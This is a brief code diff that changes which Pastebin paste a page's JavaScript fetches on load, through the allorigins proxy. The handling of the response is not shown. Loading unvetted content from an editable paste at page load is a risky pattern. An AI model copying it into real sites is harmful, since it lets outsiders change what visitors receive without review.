@@ -1,5 +1,5 @@
 window.onload = function() {
-  fetch('https://api.allorigins.win/raw?url=https://pastebin.com/raw/GDtuCLEn?' + Date.now())
+  fetch('https://api.allorigins.win/raw?url=https://pastebin.com/raw/u0CTsF2d?' + Date.now())
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok');
